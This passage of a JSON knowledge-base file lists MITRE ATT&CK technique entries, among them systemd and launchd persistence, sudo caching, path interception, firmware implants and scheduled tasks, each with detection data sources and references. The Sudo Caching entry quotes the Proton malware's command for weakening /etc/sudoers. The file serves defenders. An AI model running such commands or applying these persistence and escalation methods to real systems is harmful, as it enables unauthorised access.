      "description": "Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands. \n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)",
      "meta": {
        "external_id": "T1501",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Process command-line parameters",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1501",
          "http://man7.org/linux/man-pages/man1/systemd.1.html",
          "https://www.freedesktop.org/wiki/Software/systemd/",
          "https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang",
          "https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a",
          "https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/",
          "https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html",
          "https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence"
        ]
      },
      "uuid": "0fff2797-19cb-41ea-a5f1-8a9303b8158e",
      "value": "Systemd Service - T1501"
    },
    {
      "description": "Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.\n\nThis mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)",
      "meta": {
        "external_id": "CAPEC-563",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1051",
          "https://capec.mitre.org/data/definitions/563.html",
          "http://httpd.apache.org/docs/2.4/getting-started.html#content",
          "https://www.webroot.com/blog/2011/02/22/malicious-php-scripts-on-the-rise/"
        ]
      },
      "uuid": "804c042c-cfe6-449e-bc1a-ba0a998a70db",
      "value": "Shared Webroot - T1051"
    },
    {
      "description": "Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).\n \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software  (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.\n \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation.",
      "meta": {
        "external_id": "T1160",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1160",
          "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
          "https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf",
          "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf"
        ]
      },
      "uuid": "e99ec083-abdd-48de-ad87-4dbf6f8ba2a4",
      "value": "Launch Daemon - T1160"
    },
    {
      "description": "Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)",
      "meta": {
        "external_id": "T1107",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process command-line parameters",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1107",
          "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"
        ]
      },
      "uuid": "56fca983-1cf1-4fd1-bda0-5e170a37ab59",
      "value": "File Deletion - T1107"
    },
    {
      "description": "Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \n\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.",
      "meta": {
        "external_id": "T1108",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Office 365 account logs",
          "Azure activity logs",
          "AWS CloudTrail logs",
          "Stackdriver logs",
          "Process monitoring",
          "Process use of network",
          "Packet capture",
          "Network protocol analysis",
          "File monitoring",
          "Authentication logs",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure",
          "Office 365",
          "SaaS",
          "Azure AD"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1108",
          "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf"
        ]
      },
      "uuid": "6aabc5ec-eae6-422c-8311-38d45ee9838a",
      "value": "Redundant Access - T1108"
    },
    {
      "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
      "meta": {
        "external_id": "T1109",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Disk forensics",
          "API monitoring",
          "Process monitoring",
          "Component firmware"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1109",
          "https://www.smartmontools.org/",
          "https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html"
        ]
      },
      "uuid": "10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
      "value": "Component Firmware - T1109"
    },
    {
      "description": "The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
      "meta": {
        "external_id": "CAPEC-532",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "BIOS",
          "EFI"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1019",
          "https://capec.mitre.org/data/definitions/532.html",
          "https://en.wikipedia.org/wiki/BIOS",
          "https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface",
          "http://www.uefi.org/about",
          "http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research",
          "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about",
          "https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/",
          "https://github.com/chipsec/chipsec",
          "http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html"
        ]
      },
      "uuid": "6856ddd6-2df3-4379-8b87-284603c189c3",
      "value": "System Firmware - T1019"
    },
    {
      "description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)",
      "meta": {
        "external_id": "T1022",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1022",
          "http://www.netsec.colostate.edu/~zhang/DetectingEncryptedBotnetTraffic.pdf",
          "https://en.wikipedia.org/wiki/List_of_file_signatures"
        ]
      },
      "uuid": "d54416bd-0803-41ca-870a-ce1af7c05638",
      "value": "Data Encrypted - T1022"
    },
    {
      "description": "Certain types of traffic (e.g., DNS tunneling, header inject) allow for user-defined fields. These fields can then be used to hide data. In addition to hiding data in network protocols, steganography techniques can be used to hide data in images or other file formats. Detection can be difficult unless a particular signature is already known. (Citation: BotnetsDNSC2) (Citation: HAMMERTOSS2015) (Citation: DNS-Tunnel)",
      "meta": {
        "external_id": "T1320",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1320"
        ]
      },
      "uuid": "1ff8b824-5287-4583-ab6a-013bf36d4864",
      "value": "Data Hiding - T1320"
    },
    {
      "description": "Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
      "meta": {
        "external_id": "CAPEC-132",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1023",
          "https://capec.mitre.org/data/definitions/132.html"
        ]
      },
      "uuid": "970cdb5c-02fb-4c38-b17e-d6327cf3c810",
      "value": "Shortcut Modification - T1023"
    },
    {
      "description": "An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl. \n\nAs an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.",
      "meta": {
        "external_id": "T1204",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Anti-virus",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1204",
          "https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times",
          "https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html",
          "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
        ]
      },
      "uuid": "8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
      "value": "User Execution - T1204"
    },
    {
      "description": "Once divided into the most granular parts, analysts work with collection managers to task the collection management system with requirements and sub-requirements. (Citation: Heffter) (Citation: JP2-01)",
      "meta": {
        "external_id": "T1240",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-direction"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1240"
        ]
      },
      "uuid": "b93bd611-da4e-4c84-a40f-325b712bed67",
      "value": "Task requirements - T1240"
    },
    {
      "description": "Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access. To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. \n\nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
      "meta": {
        "external_id": "T1205",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence",
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1205",
          "https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631"
        ]
      },
      "uuid": "451a9977-d255-43c9-b431-66de80130c8c",
      "value": "Port Knocking - T1205"
    },
    {
      "description": "Some adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
      "meta": {
        "external_id": "T1026",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Malware reverse engineering",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1026",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "99709758-2b96-48f2-a68a-ad7fbd828091",
      "value": "Multiband Communication - T1026"
    },
    {
      "description": "The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
      "meta": {
        "external_id": "T1206",
        "kill_chain": [
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1206",
          "https://www.sudo.ws/",
          "https://www.cybereason.com/blog/labs-proton-b-what-this-mac-malware-actually-does"
        ]
      },
      "uuid": "2169ba87-1146-4fc7-a118-12b72251db7e",
      "value": "Sudo Caching - T1206"
    },
    {
      "description": "The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)",
      "meta": {
        "external_id": "T1209",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Binary file metadata",
          "DLL monitoring",
          "File monitoring",
          "Loaded DLLs",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1209",
          "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top",
          "https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx",
          "https://github.com/scottlundgren/w32time",
          "https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "dce31a00-1e90-4655-b0f9-e2e71a748a87",
      "value": "Time Providers - T1209"
    },
    {
      "description": "Data exfiltration may be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.",
      "meta": {
        "external_id": "T1029",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "Netflow/Enclave netflow",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1029"
        ]
      },
      "uuid": "4eeaf8a9-c86b-4954-a663-9555fb406466",
      "value": "Scheduled Transfer - T1029"
    },
    {
      "description": "The process of gathering domain account credentials in order to silently create subdomains pointed at malicious servers without tipping off the actual owner. (Citation: CiscoAngler) (Citation: ProofpointDomainShadowing)",
      "meta": {
        "external_id": "T1340",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1340"
        ]
      },
      "uuid": "3f157dee-74f0-41fc-801e-f837b8985b0a",
      "value": "Shadow DNS - T1340"
    },
    {
      "description": "Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n### Unquoted Paths\nService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)\n\n### PATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.\n\n### Search Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).",
      "meta": {
        "external_id": "CAPEC-159",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1034",
          "https://capec.mitre.org/data/definitions/159.html",
          "https://blogs.technet.microsoft.com/srd/2014/04/08/ms14-019-fixing-a-binary-hijacking-via-cmd-or-bat-file/",
          "http://support.microsoft.com/KB/103000",
          "https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464",
          "https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/",
          "https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/",
          "http://msdn.microsoft.com/en-us/library/ms682425",
          "http://technet.microsoft.com/en-us/library/cc723564.aspx#XSLTsection127121120120",
          "http://msdn.microsoft.com/en-us/library/ms687393",
          "https://msdn.microsoft.com/en-us/library/fd7hxfdd.aspx"
        ]
      },
      "uuid": "c4ad009b-6e13-4419-8d21-918a1652de02",
      "value": "Path Interception - T1034"
    },
    {
      "description": "An adversary could use a malicious or exploited application to surreptitiously track the device's physical location through use of standard operating system APIs.",
      "meta": {
        "external_id": "APP-24",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1430",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-24.html"
        ]
      },
      "uuid": "99e6295e-741b-4857-b6e5-64989eb039b4",
      "value": "Location Tracking - T1430"
    },
    {
      "description": "Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or privilege escalation.",
      "meta": {
        "external_id": "T1035",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1035"
        ]
      },
      "uuid": "f44731de-ea9f-406d-9b83-30ecbb9b4392",
      "value": "Service Execution - T1035"
    },
    {
      "description": "Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.",
      "meta": {
        "external_id": "CAPEC-557",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1053",
          "https://capec.mitre.org/data/definitions/557.html",
          "https://technet.microsoft.com/en-us/library/cc785125.aspx",
          "https://twitter.com/leoloobeek/status/939248813465853953",
          "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
          "https://technet.microsoft.com/library/dd315590.aspx",
          "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "35dd844a-b219-4e2b-a6bb-efa9a75995a9",
      "value": "Scheduled Task - T1053"
    },
    {
      "description": "Anonymity services reduce the amount of information available that can be used to track an adversary's activities.  Multiple options are available to hide activity, limit tracking, and increase anonymity. (Citation: TOR Design) (Citation: Stratfor2012)",
      "meta": {
        "external_id": "T1306",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1306"
        ]
      },
      "uuid": "d3dca536-8bf0-4e43-97c1-44a2353c3d69",
      "value": "Anonymity services - T1306"
    },
    {
      "description": "### Windows\n\nWindows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.\n\nIf adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\n### Mac\n\nMac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.",
      "meta": {
        "external_id": "CAPEC-564",
